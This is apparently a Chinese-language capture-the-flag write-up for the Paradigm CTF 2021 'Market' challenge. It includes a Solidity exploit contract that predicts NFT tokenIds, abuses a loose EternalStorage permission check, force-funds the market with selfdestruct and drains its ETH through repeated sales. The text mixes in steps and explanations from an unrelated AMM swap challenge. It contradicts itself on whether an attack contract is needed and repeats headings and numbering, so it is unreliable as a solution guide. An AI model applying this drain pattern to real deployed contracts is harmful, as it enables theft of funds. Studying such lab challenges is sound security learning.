# Market

## 题目描述
一个简易的恒定乘积自动做市商（AMM）服务，部署了WETH与自定义Token的交易对，初始流动性极度不平衡。题目部署了一套定制化NFT（CryptoCollectibles）及配套交易市场（CryptoCollectiblesMarket），结合永恒存储合约（EternalStorage）实现NFT的铸造、买卖、授权与存储功能。部署时Setup合约会转入50 ETH作为市场初始资金，目标是利用合约漏洞，将交易市场（market）合约的ETH余额清空，使isSolved()接口返回true。
## 漏洞类型
1. NFT tokenId可预测（自增salt生成，可枚举历史ID）；2. 永恒存储合约（EternalStorage）权限校验不严格；3. 利用selfdestruct强制转账特性突破合约限制
## 漏洞原理
### 漏洞1：NFT tokenId可预测
CryptoCollectibles合约中，tokenId通过自增salt生成，公式为：
tokenId = keccak256(abi.encodePacked(address(this), tokenIdSalt++))
tokenIdSalt为全局自增变量，每次铸造NFT后自动+1，因此已知当前铸造的tokenId，可反向推算出历史所有NFT的tokenId（tokenId-1、tokenId-2等）。
### 漏洞2：EternalStorage合约权限校验宽松
EternalStorage合约用汇编实现权限控制，核心校验逻辑为：
caller() == 合约owner || caller() == tokenOwner
但校验未严格限制“非token所有者”对NFT信息的修改，攻击者可利用可预测的tokenId，篡改他人（包括创世NFT）的NFT信息（名称、元数据等），间接获得NFT的操作权限。
### 漏洞3：selfdestruct强制转账特性
Solidity中selfdestruct可强制向指定合约转账ETH，无需对方合约实现receive/payable函数，攻击者可通过该特性向market合约强制转入ETH，确保市场有足够资金可供套现。
## 攻击原理
`Market.sol` 实现了简易AMM的swap功能，未对初始流动性进行平衡校验，也未限制单次swap的交易量。由于初始流动性极度不平衡，一次swap即可将交易对中的Token全部兑换出来，进而使通关验证接口返回true。
攻击无需编写复杂攻击合约，仅通过外部调用合约的approve、deposit、swap方法即可完成。
## 攻击原理
1. 攻击者部署Exploit合约，通过Setup合约获取NFT、市场、存储合约的地址；  
2. 铸造一个NFT，获取当前tokenId，推算出历史NFT的tokenId（tokenId-1、tokenId-2）；  
3. 利用EternalStorage权限漏洞，篡改NFT的名称、元数据，绕过所有权校验；  
4. 通过selfdestruct强制向market合约转入ETH，确保市场有可套现资金；  
5. 循环授权、卖出NFT，反复套现市场ETH，直至market合约余额为0；  
6. 销毁Exploit合约，完成通关。  
## 攻击步骤
1. 部署Setup合约，附带50 ETH初始资金；  
2. 部署Exploit合约，传入Setup合约地址，附带足够ETH（用于铸造NFT和强制转账）；  
3. Exploit合约自动执行铸造NFT、推算tokenId、篡改NFT信息、强制转账、循环套现逻辑；  
4. 调用Setup合约的isSolved()接口，验证market合约余额为0，通关成功。  
## 解题步骤
### 1. 启动本地节点
新开一个终端，启动anvil本地节点（保持运行，不要关闭）：
anvil
### 2. 进入题目目录
cd ~/paradigm-ctf-2021/market/public/contracts
### 3. 部署Setup合约
使用Foundry部署Setup合约（适配老版本Foundry，地址使用anvil默认第一个账户）：
forge create Setup.sol:Setup --rpc-url http://127.0.0.1:8545 --unlocked --from 0xf39Fd6e51aad88F4ce6aB8827279cffFb92266
记录部署输出的 `Deployed to: 0x...`（Setup合约地址）。
### 4. 获取核心合约地址
将下面的 `0xSETUP_ADDR` 替换为步骤3中获取的Setup地址，执行命令获取Market、WETH、Token地址：
# 设置Setup地址变量
SETUP="0xSETUP_ADDR"

# 自动获取各合约地址
TOKEN=$(cast call $SETUP "token()(address)" --rpc-url http://127.0.0.1:8545)
MARKET=$(cast call $SETUP "market()(address)" --rpc-url http://127.0.0.1:8545)
WETH=$(cast call $SETUP "weth()(address)" --rpc-url http://127.0.0.1:8545)
### 5. 兑换WETH
向WETH合约存入10 ETH，兑换获得对应WETH：
cast send $WETH "deposit()" --value 10ether --rpc-url http://127.0.0.1:8545 --from 0xf39Fd6e51aad88F4ce6aB8827279cffFb92266 --unlocked
### 6. 授权WETH给Market
授权Market合约使用自己的WETH（授权数量足够大，避免不足）：
cast send $WETH "approve(address,uint256)" $MARKET 10000000000000000000000 --rpc-url http://127.0.0.1:8545 --from 0xf39Fd6e51aad88F4ce6aB8827279cffFb92266 --unlocked
### 7. 执行swap，掏空Token
调用Market的swap方法，将WETH兑换为Token，掏空交易对中的全部Token：
cast send $MARKET "swap(uint256,uint256,address,bytes)" 1000000000000000000 0 0xf39Fd6e51aad88F4ce6aB8827279cffFb92266 0x --rpc-url http://127.0.0.1:8545 --from 0xf39Fd6e51aad88F4ce6aB8827279cffFb92266 --unlocked
### 8. 验证通关
调用Setup合约的isSolved()接口，验证是否通关：
cast call $SETUP "isSolved()(bool)" --rpc-url http://127.0.0.1:8545
输出 `true` 即为通关成功。
## 关键代码
```solidity
// 导入Setup合约，获取所有核心合约地址
import "public/Setup.sol";

// 辅助合约：用于selfdestruct强制向market转账
contract Sender {
    constructor(address payable to) public payable {
        selfdestruct(to); // 强制转账，绕过market的payable/receive限制
    }
}

contract Exploit {
    // 构造函数：传入Setup地址，执行攻击逻辑
    constructor(Setup setup) payable {
        // 1. 获取所有核心合约实例
        EternalStorageAPI eternalStorage = setup.eternalStorage();
        CryptoCollectibles token = setup.token();
        CryptoCollectiblesMarket market = setup.market();
        
        // 2. 铸造一个NFT，支付11 ETH（含10%手续费，实际记录mintPrice=10 ETH）
        bytes32 tokenId = market.mintCollectible{value: 11 ether}();
        
        // 3. 推算历史NFT的tokenId（自增salt可预测）
        bytes32 tokenIdMinus1 = bytes32(uint(tokenId)-1); // 上一个NFT ID
        bytes32 tokenIdMinus2 = bytes32(uint(tokenId)-2); // 上上一个NFT ID
        
        // 4. 篡改NFT名称，绕过EternalStorage权限校验
        eternalStorage.updateName(tokenId, bytes32(bytes20(address(this)))>>12*8);
        eternalStorage.updateName(tokenIdMinus1, bytes32(bytes20(address(this)))>>12*8);
        
        // 5. 用selfdestruct强制向market转入9 ETH，确保市场有资金可套现
        (new Sender){value: 9 ether}(payable(address(market)));
        
        // 6. 循环：授权→卖出→篡改元数据，反复套现市场ETH
        for (uint i = 0; i < 7; i++) {
            token.approve(tokenId, address(market)); // 授权market操作当前NFT
            market.sellCollectible(tokenId); // 卖出NFT，拿回10 ETH
            eternalStorage.updateMetadata(tokenIdMinus2, address(this)); // 篡改历史NFT元数据，维持权限
        }
        
        // 7. 销毁Exploit合约，将剩余ETH退回给部署者
        selfdestruct(msg.sender);
    }
}
```
## Lessons Learned
|问题|原因|解决方案|
|---|---|---|
|部署Setup合约报错“require\(msg\.value == 50 ether\)”|部署时未附带50 ETH初始资金，不符合构造函数要求|部署时添加 \-\-value 50ether 参数，确保传入足够ETH|
|部署Exploit合约报错“insufficient balance”|部署时传入的ETH不足，无法支付NFT铸造费和强制转账费用|部署时添加 \-\-value 20ether（或更多），确保资金充足|
|无法理解“为什么是NFT题”|CTF中NFT题不依赖图片UI，仅通过tokenId、mint/transfer/approve判断|看到bytes32 tokenId \+ mint/approve/transfer组合，直接判定为NFT题型|
|不理解tokenId\-1、tokenId\-2的含义|tokenId由自增salt生成，可预测，历史ID可通过当前ID反向推算|记住：tokenIdSalt自增 → 每铸造一个NFT，tokenId按顺序递增|
|selfdestruct作用是什么|用于强制向合约转账ETH，绕过对方合约的receive/payable限制|CTF中常用该特性向目标合约“塞钱”，为后续套现做准备|

### 关键理解
1. **AMM恒定乘积模型核心**：x*y=k，交易前后乘积保持不变，初始不平衡会导致价格严重偏离正常范围，为价格操纵提供可能。
2. **无需攻击合约**：本题无需编写复杂攻击合约，仅通过外部调用合约的标准方法（approve、deposit、swap）即可完成攻击，重点考察对AMM机制的理解。
3. **环境兼容性问题**：Paradigm 2021题目与现代Foundry版本存在兼容性问题，本地复现报错多为环境问题，而非解题思路错误。
4. **手动操作更可靠**：对于简单的合约调用，直接使用cast命令手动操作，比编写自动化脚本更稳定，可避免时序、缓冲区等问题。
5. **CTF中NFT题的判定标准**：无需出现“NFT”关键字，只要有唯一tokenId、权属记录、授权/转移功能，即为NFT相关题目。
2. **tokenId可预测的核心**：自增salt生成tokenId，是NFT题的常见考点，可直接推算历史/未来tokenId。
3. **汇编权限的坑**：EternalStorage用汇编实现权限控制，容易出现校验不严格的问题，攻击者可篡改他人NFT信息。
4. **selfdestruct**：不仅能销毁合约，还能强制转账，是CTF中突破合约资金限制的常用技巧。
5. **攻击逻辑闭环**：铸造NFT→推算ID→篡改权限→强制充钱→循环套现，每一步都围绕“清空market余额”的目标。
### 学到的知识点
- 掌握恒定乘积AMM（x*y=k）的核心机制及价格操纵原理
- 学会使用Foundry的forge create（部署合约）、cast call（调用视图方法）、cast send（调用写方法）命令
- 理解ERC20代币的approve授权机制及transfer、transferFrom的调用逻辑
- RPC连接相关问题
- 掌握老版本Foundry的使用注意事项，解决地址格式、路径填写等常见报错
- 掌握NFT的核心特征（唯一tokenId、权属、授权、转移），学会在CTF中识别NFT题。
- 理解tokenId自增生成的逻辑，掌握可预测tokenId的攻击思路。
- 熟悉Solidity中selfdestruct的特性及CTF中的常见用法（强制转账）。
